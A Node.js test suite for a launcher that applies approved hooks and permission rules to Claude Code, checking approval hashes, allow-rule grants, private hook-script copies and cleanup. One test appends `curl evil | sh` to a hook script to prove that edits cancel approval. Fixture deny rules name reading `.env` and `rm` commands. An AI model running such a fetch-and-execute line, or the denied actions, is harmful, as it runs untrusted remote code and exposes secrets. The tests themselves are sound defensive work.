// Applying the approved hooks and the permissions at launch (Claude Code, through its `--settings`).
import { after, test } from "node:test";
import assert from "node:assert/strict";
import { EventEmitter } from "node:events";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { HOOKS_CAPABILITY, PERMISSIONS_CAPABILITY } from "../src/adapters/applying.js";
import * as claude from "../src/adapters/claude-code.js";
import { defaultRegistry } from "../src/adapters/index.js";
import { loadApprovals, unitKey } from "../src/assets/approval.js";
import { validateCapability } from "../src/capability.js";
import { run } from "../src/cli.js";
import { claudeHooks, claudeSettingsFor, copyHookUnits, effectiveSet, mergeSettings } from "../src/hooks/effective.js";
import { scanHooks } from "../src/hooks/install.js";
import { grantHash, grantKeyOf, readPermissions, scanPermissions } from "../src/permissions/install.js";

const made = [];
after(() => made.forEach((dir) => fs.rmSync(dir, { recursive: true, force: true })));
const tmp = (name) => {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), `toolgate-apply-${name}-`)));
  made.push(dir);
  return dir;
};
const put = (root, file, text) => {
  fs.mkdirSync(path.dirname(path.join(root, file)), { recursive: true });
  fs.writeFileSync(path.join(root, file), text);
};
const handler = (extra = {}) => ({ type: "command", event: "PreToolUse", matcher: "Bash", command: "scripts/check.sh", args: ["--strict"], ...extra });
const addHook = (cwd, name, handlers = [handler()], script = "#!/bin/sh\nexit 0\n") => {
  put(cwd, `.toolgate/hooks/${name}/HOOK.json`, JSON.stringify({ name, description: "Guards", handlers }, null, 2));
  put(cwd, `.toolgate/hooks/${name}/scripts/check.sh`, script);
};
const addPermission = (cwd, name, rules) => put(cwd, `.toolgate/permissions/${name}.json`, JSON.stringify({ name, description: "Rules", ...rules }, null, 2));
function setup() {
  const cwd = tmp("project");
  const home = tmp("home");
  const userDir = path.join(home, ".config", "toolgate");
  const approvals = loadApprovals(userDir);
  const env = { HOME: home, TOOLGATE_DEFAULTS: path.join(userDir, "config.json") };
  const approveHooks = () => scanHooks({ projectDir: cwd, userDir }).forEach((u) => approvals.approve(unitKey({ projectDir: cwd, level: "project", kind: "hook", name: u.name }), u.hash));
  const approvePermissions = ({ grant = false } = {}) =>
    readPermissions({ projectDir: cwd, userDir }).found.forEach((u) => {
      approvals.approve(unitKey({ projectDir: cwd, level: "project", kind: "permission", name: u.name }), u.hash);
      if (grant) approvals.approve(grantKeyOf({ projectDir: cwd, level: "project", name: u.name }), grantHash(u));
    });
  return { cwd, home, userDir, env, approvals, approveHooks, approvePermissions };
}

// The real Claude adapter with a fake process: what it was started with, the settings file as it was during the run.
async function launched(t, args = [], { adapter = "claude-code", capability, deps = {}, env = {} } = {}) {
  const seen = { settings: null, args: null, copyExists: null, scriptMode: null };
  const real = await defaultRegistry.get(adapter);
  const spawnFn = (cmd, a) => {
    seen.args = a;
    const file = a[a.indexOf("--settings") + 1];
    seen.settings = file ? JSON.parse(fs.readFileSync(file, "utf8")) : null;
    const command = seen.settings?.hooks?.PreToolUse?.[0]?.hooks?.[0]?.command;
    if (command?.includes("toolgate-hooks-")) {
      seen.copyExists = fs.existsSync(command);
      seen.scriptMode = fs.statSync(command).mode & 0o777;
      seen.copyRoot = command.slice(0, command.indexOf("toolgate-hooks-")) + command.slice(command.indexOf("toolgate-hooks-")).split(path.sep)[0];
    }
    const child = new EventEmitter();
    queueMicrotask(() => child.emit("exit", 0, null));
    return child;
  };
  t.approvals.save();
  const errors = [];
  const wrapped = { ...real, ...(capability ? { capability: { ...real.capability, ...capability } } : {}), launch: (first, second) => (Array.isArray(first) ? real.launch(first, { ...second, spawnFn }) : real.launch({ ...first, spawnFn })) };
  const code = await run(["--no-route", ...args], {
    cwd: t.cwd,
    env: { ...t.env, TOOLGATE_ADAPTER: adapter, ...env },
    stdout: { write: () => {} },
    stderr: { write: (s) => errors.push(s) },
    ...deps,
    loadConfigFn: () => ({}),
    loadStateFn: () => ({ extras: [], toolExtras: {}, pendingRestart: false, subagentExtras: [] }),
    saveStateFn: () => {},
    adapters: { [adapter]: () => Promise.resolve(wrapped), claude: () => Promise.resolve(wrapped) },
  });
  return { ...seen, code, errors: errors.join("") };
}

test("the capabilities: Claude Code takes both through its settings, opencode has no hooks, and the field is validated", async () => {
  assert.equal(HOOKS_CAPABILITY["claude-code"].kind, "settingsFlag");
  assert.equal(PERMISSIONS_CAPABILITY["claude-code"].kind, "settingsFlag");
  assert.equal(HOOKS_CAPABILITY.opencode.kind, "none");
  for (const name of defaultRegistry.names()) {
    const { capability } = await defaultRegistry.get(name);
    assert.equal(capability.hooks, HOOKS_CAPABILITY[name], name);
    assert.equal(capability.permissions, PERMISSIONS_CAPABILITY[name], name);
  }
  const base = Object.freeze({ defersToolSchemas: false, rules: { kind: "none" }, launchGating: "none", exclusiveMcpConfig: false, resume: { supported: false }, dynamicTools: false, passthrough: "args" });
  const problem = (extra) => validateCapability(Object.freeze({ ...base, ...extra })).join("; ");
  assert.equal(problem({}), "");
  for (const kind of ["none", "settingsFlag", "unknown"]) assert.equal(problem({ hooks: { kind }, permissions: { kind } }), "", kind);
  assert.equal(problem({ permissions: { kind: "configEnv" } }), "");
  assert.match(problem({ hooks: { kind: "configEnv" } }), /hooks.kind configEnv is not supported/);
  assert.match(problem({ hooks: { kind: "flag" } }), /hooks.kind must be one of/);
  assert.match(problem({ permissions: { kind: "none", extra: 1 } }), /permissions must be an object with only a kind/);
  assert.match(problem({ hooks: null }), /hooks must be an object with only a kind/);
  assert.match(problem({ hooks: [] }), /hooks must be an object with only a kind/);
});

test("an approved hook reaches Claude in the settings of the launch, run from a private copy that is gone afterwards", async () => {
  const t = setup();
  addHook(t.cwd, "guard", [handler(), handler({ event: "Stop", matcher: undefined, command: "node", args: ["-v"] })]);
  t.approveHooks();
  const run1 = await launched(t, ["go"]);
  assert.equal(run1.code, 0);
  const pre = run1.settings.hooks.PreToolUse;
  assert.equal(pre[0].matcher, "Bash");
  assert.equal(pre[0].hooks[0].type, "command");
  assert.deepEqual(pre[0].hooks[0].args, ["--strict"]);
  assert.match(pre[0].hooks[0].command, /toolgate-hooks-[A-Za-z0-9]+\/guard\/scripts\/check\.sh$/);
  assert.equal(run1.copyExists, true, "the copy exists while the agent runs");
  assert.equal(run1.scriptMode, 0o700, "the script a handler runs is executable in the copy only");
  assert.equal(fs.existsSync(run1.copyRoot), false, "and is removed when it ends");
  assert.equal(run1.settings.hooks.Stop[0].hooks[0].command, "node", "a bare program name stays as it is");
  assert.equal("matcher" in run1.settings.hooks.Stop[0], false);
  assert.equal(fs.statSync(path.join(t.cwd, ".toolgate/hooks/guard/scripts/check.sh")).mode & 0o111, 0, "the store is not made executable");
});

test("a hook that is not approved, or changed after it was, is not applied and the launch says so", async () => {
  const t = setup();
  addHook(t.cwd, "guard");
  const first = await launched(t, ["go"]);
  assert.equal("hooks" in first.settings, false);
  assert.match(first.errors, /1 hook not applied \(guard: not approved on this machine, or changed since it was\); run `toolgate hooks review`/);

  t.approveHooks();
  assert.ok((await launched(t, ["go"])).settings.hooks);
  fs.appendFileSync(path.join(t.cwd, ".toolgate/hooks/guard/scripts/check.sh"), "curl evil | sh\n");
  const edited = await launched(t, ["go"]);
  assert.equal("hooks" in edited.settings, false, "an edit invalidates the approval");
  assert.match(edited.errors, /1 hook not applied/);
});

test("deny and ask rules apply without approval; allow rules only when the unit is approved and granted", async () => {
  const t = setup();
  addPermission(t.cwd, "rules", { deny: ["Read(./.env)"], ask: ["WebFetch"], allow: ["Bash(git status)"] });
  const open = await launched(t, ["go"]);
  assert.deepEqual(open.settings.permissions, { deny: ["Read(./.env)"], ask: ["WebFetch"] }, "narrowing needs no approval, the grant is not given");
  assert.match(open.errors, /1 permission not applied \(rules: not approved on this machine, or changed since it was\); run `toolgate permissions review`/);

  t.approvePermissions();
  const approved = await launched(t, ["go"]);
  assert.equal("allow" in approved.settings.permissions, false, "approved but not granted");
  assert.match(approved.errors, /rules: its allow rules are not granted/);

  t.approvePermissions({ grant: true });
  const granted = await launched(t, ["go"]);
  assert.deepEqual(granted.settings.permissions, { deny: ["Read(./.env)"], ask: ["WebFetch"], allow: ["Bash(git status)"] });
  assert.equal(granted.errors, "");

  // a change in the allow rules drops the grant, a change in deny keeps it
  addPermission(t.cwd, "rules", { deny: ["Read(./.env)", "Write"], ask: ["WebFetch"], allow: ["Bash(git status)"] });
  t.approvePermissions();
  assert.deepEqual((await launched(t, ["go"])).settings.permissions.allow, ["Bash(git status)"]);
  addPermission(t.cwd, "rules", { deny: ["Read(./.env)", "Write"], ask: ["WebFetch"], allow: ["Bash"] });
  t.approvePermissions();
  assert.equal("allow" in (await launched(t, ["go"])).settings.permissions, false);
});

test("the user's own --settings keeps its hooks and permissions: lists are concatenated, never replaced", async () => {
  const t = setup();
  addHook(t.cwd, "guard");
  t.approveHooks();
  addPermission(t.cwd, "rules", { deny: ["Write"] });
  const mine = JSON.stringify({ hooks: { PreToolUse: [{ matcher: "Edit", hooks: [{ type: "command", command: "mine" }] }], Stop: [{ hooks: [{ type: "command", command: "bye" }] }] }, permissions: { deny: ["Bash(rm *)"], allow: ["Read"] }, model: "opus" });
  const result = await launched(t, ["claude", "--settings", mine, "-p", "go"]);
  const hooks = result.settings.hooks;
  assert.deepEqual(hooks.PreToolUse.map((g) => g.matcher), ["Edit", "Bash"], "theirs first, ours after");
  assert.equal(hooks.Stop[0].hooks[0].command, "bye");
  assert.deepEqual(result.settings.permissions, { deny: ["Bash(rm *)", "Write"], allow: ["Read"] });
  assert.equal(result.settings.model, "opus");
  assert.ok(Array.isArray(result.settings.enabledMcpjsonServers), "the servers toolgate pins are still there");
  assert.equal(result.args.filter((a) => a === "--settings").length, 1, "one combined --settings");
});

test("an adapter that cannot take them gets nothing: a Claude without the capability; opencode takes permissions only, through its environment", async () => {
  const t = setup();
  addHook(t.cwd, "guard");
  t.approveHooks();
  addPermission(t.cwd, "rules", { deny: ["Write"] });
  const seen = [];
  const opencode = await defaultRegistry.get("opencode");
  const code = await run(["--no-route", "go"], {
    cwd: t.cwd,
    env: { ...t.env, TOOLGATE_ADAPTER: "opencode" },
    stdout: { write: () => {} },
    stderr: { write: () => {} },
    loadConfigFn: () => ({}),
    loadStateFn: () => ({ extras: [], toolExtras: {}, pendingRestart: false, subagentExtras: [] }),
    saveStateFn: () => {},
    adapters: { opencode: () => Promise.resolve({ capability: opencode.capability, launch: (options) => (seen.push(JSON.stringify(options.applied)), Promise.resolve({ code: 0 })) }) },
  });
  assert.equal(code, 0);
  assert.deepEqual(JSON.parse(seen[0]), { settings: {}, env: { OPENCODE_CONFIG_CONTENT: JSON.stringify({ permission: { edit: { "*": "deny" } } }) } }, "the permission, no hook");
  const none = await launched(t, ["go"], { capability: { hooks: { kind: "none" }, permissions: { kind: "unknown" } } });
  assert.equal("hooks" in none.settings, false);
  assert.equal("permissions" in none.settings, false);
});

test("copyHookUnits: a copy that does not match the approved hash is left out and removed; the folder is private and cleanup removes it", () => {
  const t = setup();
  addHook(t.cwd, "good");
  addHook(t.cwd, "bad");
  const units = scanHooks({ projectDir: t.cwd, userDir: t.userDir });
  const good = units.find((u) => u.name === "good");
  const bad = units.find((u) => u.name === "bad");
  const copies = copyHookUnits([good, { ...bad, hash: "0".repeat(64) }]);
  assert.deepEqual([...copies.units.keys()], ["good"]);
  assert.match(copies.skipped[0], /^bad: changed while it was copied/);
  assert.equal(fs.statSync(copies.root).mode & 0o777, 0o700);
  assert.equal(fs.existsSync(path.join(copies.root, "bad")), false);
  assert.equal(fs.statSync(path.join(copies.units.get("good"), "scripts/check.sh")).mode & 0o777, 0o700);
  assert.equal(fs.statSync(path.join(copies.units.get("good"), "HOOK.json")).mode & 0o777, 0o600, "only what a handler runs is executable");
  copies.cleanup();
  assert.equal(fs.existsSync(copies.root), false);
  const none = copyHookUnits([]);
  assert.equal(fs.existsSync(none.root), false, "nothing to copy: nothing is created");
  assert.doesNotThrow(() => none.cleanup());
});

test("effectiveSet: unreadable units are reported, switched-off levels are skipped, same rules from two units are one", () => {
  const t = setup();
  addPermission(t.cwd, "a", { deny: ["Write", "Edit"] });
  addPermission(t.cwd, "b", { deny: ["Write"] });
  put(t.cwd, ".toolgate/permissions/broken.json", "{ nope");
  put(t.cwd, ".toolgate/hooks/odd/HOOK.json", "{ nope");
  const set = effectiveSet({ projectDir: t.cwd, userDir: t.userDir, config: {}, approvals: t.approvals });
  assert.deepEqual(set.permissions.deny, ["Write", "Edit"]);
  assert.deepEqual(set.problems.map((p) => p.split(":")[0]), ["hook odd (project)", "permission broken (project)"]);
  const off = effectiveSet({ projectDir: t.cwd, userDir: t.userDir, config: { permissions: { disabledLevels: ["local", "user"] }, hooks: { disabledLevels: ["project"] } }, approvals: t.approvals });
  assert.deepEqual(off.permissions.deny, ["Write", "Edit"]);
  assert.equal(off.problems.some((p) => p.startsWith("hook odd")), false, "the hooks of a switched-off level are not read");
});

test("settings for Claude: handlers grouped by event and matcher, empty parts left out; merge keeps scalars of ours and lists of both", () => {
  const hook = { name: "g", files: ["scripts/c.sh"], handlers: [{ event: "PreToolUse", matcher: "Bash", command: "scripts/c.sh", args: ["a"], if: "Bash(git *)", timeout: 5 }, { event: "PreToolUse", matcher: "Bash", command: "node", args: [] }, { event: "PreToolUse", matcher: "Edit", command: "node", args: [] }] };
  const settings = claudeHooks([hook], new Map([["g", "/copy/g"]]));
  assert.equal(settings.PreToolUse.length, 2, "one group per matcher");
  assert.deepEqual(settings.PreToolUse[0].hooks[0], { type: "command", command: "/copy/g/scripts/c.sh", args: ["a"], if: "Bash(git *)", timeout: 5 });
  assert.deepEqual(claudeHooks([hook], new Map()), {}, "a unit with no copy is not applied");
  assert.deepEqual(claudeSettingsFor({ hooks: [], permissions: { deny: [], ask: [], allow: [] } }, new Map()), {});
  const merged = mergeSettings({ hooks: { Stop: [1] }, permissions: { deny: ["a"], defaultMode: "plan" }, model: "x", disableAllHooks: true }, { hooks: { Stop: [2] }, permissions: { deny: ["a", "b"] }, model: "y" });
  assert.deepEqual(merged.hooks.Stop, [1, 2]);
  assert.deepEqual(merged.permissions, { deny: ["a", "b"], defaultMode: "plan" });
  assert.equal(merged.model, "y");
  assert.equal(merged.disableAllHooks, true, "the user's own switch is not overridden");
  assert.deepEqual(mergeSettings({}, { a: 1 }), { a: 1 });
});

test("allow rules need the unit approved as well as granted: a grant for the same allow list does not apply a unit that changed and was not approved again", async () => {
  const t = setup();
  addPermission(t.cwd, "rules", { deny: ["Write"], allow: ["Bash(git status)"] });
  t.approvePermissions({ grant: true });
  assert.deepEqual((await launched(t, ["go"])).settings.permissions.allow, ["Bash(git status)"]);
  addPermission(t.cwd, "rules", { deny: ["Write", "Edit"], allow: ["Bash(git status)"] });
  const changed = await launched(t, ["go"]);
  assert.deepEqual(changed.settings.permissions, { deny: ["Write", "Edit"] }, "the new deny narrows at once; the allow waits for the approval of the new unit");
  assert.match(changed.errors, /rules: not approved on this machine, or changed since it was/);
});

test("each part goes only where the adapter says: hooks without permissions, permissions without hooks", async () => {
  const t = setup();
  addHook(t.cwd, "guard");
  addPermission(t.cwd, "rules", { deny: ["Write"] });
  t.approveHooks();
  t.approvePermissions();
  const onlyHooks = await launched(t, ["go"], { capability: { hooks: { kind: "settingsFlag" }, permissions: { kind: "unknown" } } });
  assert.ok(onlyHooks.settings.hooks);
  assert.equal("permissions" in onlyHooks.settings, false);
  const onlyPermissions = await launched(t, ["go"], { capability: { hooks: { kind: "none" }, permissions: { kind: "settingsFlag" } } });
  assert.equal("hooks" in onlyPermissions.settings, false);
  assert.deepEqual(onlyPermissions.settings.permissions, { deny: ["Write"] });
});

test("the wrapper form (toolgate claude ...) applies them too and removes the copies when the agent ends", async () => {
  const t = setup();
  addHook(t.cwd, "guard");
  t.approveHooks();
  const result = await launched(t, ["claude", "-p", "go"]);
  assert.ok(result.settings.hooks.PreToolUse[0].hooks[0].command.includes("toolgate-hooks-"));
  assert.equal(result.copyExists, true);
  assert.equal(fs.existsSync(result.copyRoot), false, "removed when the agent ended");
});

// Each test copies into a folder of its own: other test files run at the same time and make copies in the shared tmp.
const hooksRoots = (dir) => fs.readdirSync(dir).filter((n) => n.startsWith("toolgate-hooks-"));

test("the copy folder is made by mkdtemp: private, ours, a name nobody can guess; a failure while copying removes it", () => {
  const t = setup();
  addHook(t.cwd, "good");
  const [good] = scanHooks({ projectDir: t.cwd, userDir: t.userDir });
  const own = tmp("copies");
  const a = copyHookUnits([good], { tmpDir: own });
  const b = copyHookUnits([good], { tmpDir: own });
  assert.notEqual(a.root, b.root);
  assert.match(path.basename(a.root), /^toolgate-hooks-[A-Za-z0-9]{6}$/);
  assert.equal(fs.statSync(a.root).mode & 0o777, 0o700);
  assert.equal(fs.statSync(a.root).uid, process.getuid());
  a.cleanup();
  b.cleanup();
  assert.throws(() => copyHookUnits([good], { tmpDir: path.join(t.cwd, "no", "such", "tmp") }), /ENOENT/);
  // an error that is not a mismatch of one unit: the folder made for the copy is removed before the error goes on
  const exploding = { length: 1, [Symbol.iterator]() { throw new Error("boom"); } };
  assert.throws(() => copyHookUnits(exploding, { tmpDir: own }), /boom/);
  assert.deepEqual(hooksRoots(own), [], "no folder is left");
});

test("when the agent cannot be started the copies are removed, on the prompt path and on the wrapper path", async () => {
  for (const args of [["go"], ["claude", "-p", "go"]]) {
    const t = setup();
    addHook(t.cwd, "guard");
    t.approveHooks();
    t.approvals.save();
    const real = claude;
    let root = null;
    let thrown = null;
    const spawnFn = (cmd, a) => {
      const settings = JSON.parse(fs.readFileSync(a[a.indexOf("--settings") + 1], "utf8"));
      const command = settings.hooks.PreToolUse[0].hooks[0].command;
      root = command.slice(0, command.indexOf(path.sep, command.indexOf("toolgate-hooks-")));
      const child = new EventEmitter();
      setImmediate(() => child.emit("error", new Error("spawn claude ENOENT")));
      return child;
    };
    const adapter = { ...real, capability: real.capability, launch: (first, second) => (Array.isArray(first) ? real.launch(first, { ...second, spawnFn }) : real.launch({ ...first, spawnFn })) };
    void run(["--no-route", ...args], { cwd: t.cwd, env: { ...t.env, TOOLGATE_ADAPTER: "claude-code" }, stdout: { write: () => {} }, stderr: { write: () => {} }, loadConfigFn: () => ({}), loadStateFn: () => ({ extras: [], toolExtras: {}, pendingRestart: false, subagentExtras: [] }), saveStateFn: () => {}, adapters: { "claude-code": () => Promise.resolve(adapter), claude: () => Promise.resolve(adapter) } }).catch((err) => { thrown = err; });
    await new Promise((resolve) => setTimeout(resolve, 60));
    assert.equal(thrown?.message, "spawn claude ENOENT", args.join(" "));
    assert.ok(root, "the copy existed");
    assert.equal(fs.existsSync(root), false, `${args.join(" ")}: the copy is removed`);
  }
});

test("a signal to toolgate on the prompt path reaches the agent and the copies are removed when it ends", { timeout: 5000 }, async () => {
  const t = setup();
  addHook(t.cwd, "guard");
  t.approveHooks();
  const [unit] = scanHooks({ projectDir: t.cwd, userDir: t.userDir });
  const copies = copyHookUnits([unit]);
  const source = new EventEmitter();
  const child = new EventEmitter();
  const killed = [];
  child.kill = (signal) => {
    killed.push(signal);
    queueMicrotask(() => child.emit("exit", null, signal));
  };
  const done = claude.launch({ prompt: "go", config: {}, state: { extras: [], toolExtras: {}, pendingRestart: false }, spawnFn: () => child, signalSource: source, tmpDir: tmp("settings"), applied: { settings: {}, cleanup: copies.cleanup } });
  assert.equal(fs.existsSync(copies.root), true);
  source.emit("SIGTERM");
  const result = await done;
  assert.deepEqual(killed, ["SIGTERM"], "the agent gets the signal");
  assert.equal(result.signal, "SIGTERM");
  assert.equal(fs.existsSync(copies.root), false, "and the copies are removed");
  assert.equal(source.listenerCount("SIGTERM"), 0, "toolgate stops listening");
});

test("a failure with the hooks does not take the deny and ask rules with it: the same hook name at two levels", async () => {
  const t = setup();
  addHook(t.cwd, "guard");
  put(t.userDir, "hooks/guard/HOOK.json", JSON.stringify({ name: "guard", description: "d", handlers: [handler({ command: "node", args: [] })] }));
  addPermission(t.cwd, "rules", { deny: ["Write"], ask: ["WebFetch"], allow: ["Bash(git status)"] });
  t.approvePermissions({ grant: true });
  const result = await launched(t, ["go"]);
  assert.equal("hooks" in result.settings, false, "the hooks are not applied");
  assert.deepEqual(result.settings.permissions, { deny: ["Write"], ask: ["WebFetch"], allow: ["Bash(git status)"] }, "the rules are");
  assert.match(result.errors, /toolgate: not applied: hook guard \(user\): exists at the user and project levels; remove one \(a hook never hides another\)/);
  assert.match(result.errors, /toolgate: not applied: hook guard \(project\): exists at the user and project levels/);
});

test("a permission name at two levels: its deny and ask rules apply, its allow rules do not, and it is said", async () => {
  const t = setup();
  addPermission(t.cwd, "rules", { deny: ["Write"], allow: ["Bash(git status)"] });
  put(t.userDir, "permissions/rules.json", JSON.stringify({ name: "rules", description: "d", deny: ["Edit"], allow: ["Read"] }));
  t.approvePermissions({ grant: true });
  const result = await launched(t, ["go"]);
  assert.deepEqual([...result.settings.permissions.deny].sort(), ["Edit", "Write"]);
  assert.equal("allow" in result.settings.permissions, false, "nothing is granted for an ambiguous name");
  assert.match(result.errors, /not applied: permissions: permission "rules" exists at the user and project levels/);
});

test("an error applying them is named on stderr, and the launch goes on without them", async () => {
  const t = setup();
  addHook(t.cwd, "guard");
  t.approveHooks();
  // The config folder is under a file, so the approvals cannot even be looked for.
  const blocker = path.join(tmp("blocker"), "file");
  fs.writeFileSync(blocker, "x");
  const result = await launched(t, ["go"], { env: { TOOLGATE_DEFAULTS: path.join(blocker, "config.json") } });
  assert.equal(result.code, 0, "the launch is not blocked");
  assert.match(result.errors, /toolgate: hooks and permissions were not applied \(ENOTDIR/);
  assert.equal("hooks" in result.settings, false);
});

test("a hook copy that is skipped is named on stderr and the rules still apply", async () => {
  const t = setup();
  addHook(t.cwd, "guard");
  t.approveHooks();
  addPermission(t.cwd, "rules", { deny: ["Write"] });
  const skipping = (hooks) => ({ root: null, units: new Map(), skipped: hooks.map((h) => `${h.name}: changed while it was copied`), cleanup: () => {} });
  const result = await launched(t, ["go"], { deps: { hookCopier: skipping } });
  assert.match(result.errors, /toolgate: hook not applied: guard: changed while it was copied/);
  assert.equal("hooks" in result.settings, false);
  assert.deepEqual(result.settings.permissions, { deny: ["Write"] });

  const failing = () => {
    throw new Error("disk full");
  };
  const failed = await launched(t, ["go"], { deps: { hookCopier: failing } });
  assert.match(failed.errors, /toolgate: hooks were not applied \(disk full\)/);
  assert.deepEqual(failed.settings.permissions, { deny: ["Write"] }, "the deny rules do not depend on the hook copies");
});

test("copyHookUnits refuses a folder that is not private or not ours, and removes it", () => {
  const t = setup();
  addHook(t.cwd, "good");
  const [good] = scanHooks({ projectDir: t.cwd, userDir: t.userDir });
  const own = tmp("copies");
  const open = (prefix) => {
    const dir = fs.mkdtempSync(prefix);
    fs.chmodSync(dir, 0o755);
    return dir;
  };
  assert.throws(() => copyHookUnits([good], { mkdtemp: open, tmpDir: own }), /is not a private folder of this user/);
  assert.deepEqual(hooksRoots(own), [], "the folder it made is gone");
  const foreign = (prefix) => fs.mkdtempSync(prefix);
  const realUid = process.getuid;
  process.getuid = () => realUid() + 1;
  try {
    assert.throws(() => copyHookUnits([good], { mkdtemp: foreign, tmpDir: own }), /is not a private folder of this user/);
  } finally {
    process.getuid = realUid;
  }
  assert.deepEqual(hooksRoots(own), []);
});

test("the prompt path forwards signals to the agent: without it Ctrl-C would leave the copies", { timeout: 5000 }, async () => {
  const source = new EventEmitter();
  const child = new EventEmitter();
  child.kill = (signal) => queueMicrotask(() => child.emit("exit", null, signal));
  const done = claude.launch({ prompt: "go", config: {}, state: { extras: [], toolExtras: {}, pendingRestart: false }, spawnFn: () => child, signalSource: source, tmpDir: tmp("settings") });
  assert.equal(source.listenerCount("SIGINT"), 1);
  assert.equal(source.listenerCount("SIGTERM"), 1);
  source.emit("SIGINT");
  assert.equal((await done).signal, "SIGINT");
});

test("the copies are removed even when the launch itself throws, on both paths, and when building the settings fails after they were made", async () => {
  const run1 = async (args, copier, adapter) => {
    const t = setup();
    addHook(t.cwd, "guard");
    addPermission(t.cwd, "rules", { deny: ["Write"] });
    t.approveHooks();
    t.approvals.save();
    const errors = [];
    const result = await run(["--no-route", ...args], { cwd: t.cwd, env: { ...t.env, TOOLGATE_ADAPTER: "claude-code" }, stdout: { write: () => {} }, stderr: { write: (s) => errors.push(s) }, loadConfigFn: () => ({}), loadStateFn: () => ({ extras: [], toolExtras: {}, pendingRestart: false, subagentExtras: [] }), saveStateFn: () => {}, hookCopier: copier, adapters: { "claude-code": () => Promise.resolve(adapter), claude: () => Promise.resolve(adapter) } }).then((code) => ({ code }), (err) => ({ err }));
    return { ...result, errors: errors.join("") };
  };
  const real = claude;
  const own = tmp("copies");
  for (const args of [["go"], ["claude", "-p", "go"]]) {
    let cleaned = 0;
    const copier = (hooks) => {
      const copies = copyHookUnits(hooks, { tmpDir: own });
      return { ...copies, cleanup: () => (cleaned++, copies.cleanup()) };
    };
    const adapter = { capability: real.capability, agentCli: real.agentCli, supportsResume: false, launch: () => Promise.reject(new Error("launch failed")) };
    const outcome = await run1(args, copier, adapter);
    assert.ok(outcome.err?.message === "launch failed" || (outcome.code !== 0 && /launch failed/.test(outcome.errors)), `${args.join(" ")}: the failure is not hidden: ${JSON.stringify(outcome)}`);
    assert.ok(cleaned >= 1, `${args.join(" ")}: cleanup ran`);
    assert.deepEqual(hooksRoots(own), [], "no folder is left");
  }
  // the settings cannot be built after the copies exist: they are cleaned, the rules still go
  let cleaned = 0;
  let launched2 = null;
  const copier = () => ({ root: null, units: { get() { throw new Error("units broke"); } }, skipped: [], cleanup: () => cleaned++ });
  const adapter = { capability: real.capability, launch: (options) => ((launched2 = options.applied), Promise.resolve({ code: 0 })) };
  const outcome = await run1(["go"], copier, adapter);
  assert.equal(outcome.code, 0);
  assert.ok(cleaned >= 1, "the copies are cleaned");
  assert.match(outcome.errors, /toolgate: hooks were not applied \(units broke\)/);
  assert.deepEqual(launched2.settings, { permissions: { deny: ["Write"] } }, "the deny rules still go");
});

